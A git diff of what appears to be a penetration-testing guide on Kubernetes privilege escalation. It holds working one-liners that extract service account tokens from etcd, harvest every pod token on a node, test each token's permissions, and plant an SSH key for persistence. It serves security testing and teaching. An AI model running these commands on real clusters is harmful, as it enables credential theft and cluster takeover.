@@ -134,7 +134,7 @@ If you can run your pod on a control-plane node using the `nodeName` selector in
 
 Below is a quick and dirty way to grab secrets from `etcd` if it is running on the control-plane node you are on. If you want a more elegent solution that spins up a pod with the `etcd` client utility `etcdctl` and uses the control-plane node's credentials to connect to etcd wherever it is running, check out [this example manifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) from @mauilion. 
 
-Check to see if `etcd` is running on the control-plane node and see where the database is (This is on a `kubeadm` created cluster)
+**Check to see if `etcd` is running on the control-plane node and see where the database is (This is on a `kubeadm` created cluster)**
 ```
 root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
 ```
@@ -142,17 +142,17 @@ Output:
 ```
 data-dir=/var/lib/etcd
 ```
-View the data in etcd database:
+**View the data in etcd database:**
 ```
 strings /var/lib/etcd/member/snap/db | less
 ```
 
-Extract the tokens from the database and show the service account name
+**Extract the tokens from the database and show the service account name**
 ```
 db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
 ```
 
-Same command, but some greps to only return the default token in the kube-system namespace
+**Same command, but some greps to only return the default token in the kube-system namespace**
 ```
 db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
 ```
@@ -162,36 +162,24 @@ Output:
 ```
 
 
-* **Hunt for privileged service account tokens**  - Even if you can only schedule your pod on the worker node, you can also access any secret mounted within any pod on the node you are on.  In a production cluster, even on a worker node, there is usually at least one pod that has a token mounted that is bound to a service account that is bound to a clusterrolebinding, that gives you access to do things like create pods or view secrets in all namespaces. 
-
 ## Look for kubeconfig's in the host filesystem 
 
-By default, nodes don't have `kubectl` installed. If you are lucky though, an administrator tried to make their life (and yours) a little easier by installing `kubectl` and their highly privleged credentails on the node. We're not so lucky on this GKE node, but 
+By default, nodes don't have `kubectl` installed. If you are lucky though, an administrator tried to make their life (and yours) a little easier by installing `kubectl` and their highly privleged credentails on the node. We're not so lucky on this GKE node 
 
+**Some ideas:**
 ```bash
 find / -name kubeconfig
-```
-```
-/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/merged/var/lib/kube-proxy/kubeconfig
-/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
-/var/lib/node-problem-detector/kubeconfig
-/var/lib/kubelet/kubeconfig
-/var/lib/kube-proxy/kubeconfig
-/home/kubernetes/containerized_mounter/rootfs/var/lib/kubelet/kubeconfig
-/mnt/stateful_partition/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
-/mnt/stateful_partition/var/lib/node-problem-detector/kubeconfig
-/mnt/stateful_partition/var/lib/kubelet/kubeconfig
-/mnt/stateful_partition/var/lib/kube-proxy/kubeconfig
+find / -name .kube
+grep -R "current-context" /home/
+grep -R "current-context" /root/
 ```
 
 ## Grab all tokens from all pods on the system
-Even if you can only schedule your pod on the worker node, you can also access any secret mounted within any pod on the node you are on.  In a production cluster, even on a worker node, there is usually at least one pod that has a token mounted that is bound to a service account that is bound to a clusterrolebinding, that gives you access to do things like create pods or view secrets in all namespaces. 
+You can access any secret mounted within any pod on the node you are on. In a production cluster, even on a worker node, there is usually at least one pod that has a mounted *token* that is bound to a *service account* that is bound to a *clusterrolebinding*, that gives you access to do things like create pods or view secrets in all namespaces. 
 
-Use something like access-matrix to see if any of them give you more permission than you currently have. Look for tokens that have permissions to get secrets in kube-system
-
+Look for tokens that have permissions to get secrets in kube-system. The examples below automate this process for you a bit:
 
 ### Run kubectl can-i --list against ALL tokens found on the node :)
-
 ```
 tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/lib/kubelet/pods/ -name token -type l`; for filename in $tokens; do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; echo "Token Location: $filename_clean"; tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host cat $filename_clean`; echo -n "What can I do? "; kubectl --token=$tokena auth can-i --list; echo; done
 ```
@@ -201,26 +189,19 @@ tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/l
 tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/lib/kubelet/pods/ -name token -type l`; for filename in $tokens; do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; echo "Token Location: $filename_clean"; tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host cat $filename_clean`; echo -n "What can I do? "; kubectl --token=$tokena auth can-i --list -n kube-system; echo; done
 ```
 
-### This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
+### Just list the namespace and location of every token
 ```bash
 tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort
-
-default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
-default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
-development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
-development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
-kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
-kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/calico-node-token-d426t/token
-
-
-# For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
-DTOKEN=`cat /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
-kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
-kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
-
-# Does the token allow you to view secrets in that namespace? How about other namespaces?
-# Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
 ```
+
+**Can any of the tokens:**
+* Create a pod, deployment, etc. in the kube-system namespace?
+* Create a role in the kube-system namsspace?
+* View secrets in the kube-system namespace?
+* Create clusterrolebindings? 
+
+Your goal is to find a way to get access to all resources in all namspaces.
+
 
 ## Some other ideas:
 * Add your public key authorized_keys on the node and ssh to it
